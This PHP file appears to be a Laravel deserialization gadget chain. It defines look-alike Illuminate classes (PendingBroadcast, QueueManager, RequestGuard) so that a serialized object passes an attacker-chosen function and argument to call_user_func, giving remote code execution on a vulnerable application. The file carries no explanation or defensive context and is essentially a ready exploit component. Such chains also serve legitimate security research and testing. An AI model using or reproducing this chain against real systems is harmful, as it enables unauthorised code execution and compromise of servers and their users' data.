<?php

namespace Illuminate\Broadcasting {
    class PendingBroadcast
    {
        protected $events;

        function __construct($function, $param)
        {
            $this->events = new \Illuminate\Queue\QueueManager($function, $param);
        }
    }
}

namespace Illuminate\Queue {

    class QueueManager
    {
        protected $app;
        protected $connectors;

        function __construct($function, $param)
        {
            $this->app = [
                "config" => [
                    "queue.default" => "key",
                    "queue.connections.key" => [
                        "driver" => "func"
                    ]
                ]
            ];
            $this->connectors = [
                "func" => [
                    new \Illuminate\Auth\RequestGuard($function, $param),
                    "user"
                ]
            ];
        }
    }
}

namespace Illuminate\Auth {
    class RequestGuard
    {
        protected $callback;
        protected $request;
        protected $provider;

        public function __construct($function, $param)
        {
            $this->callback = "call_user_func";
            $this->request = $function;
            $this->provider = $param;
        }
    }
}
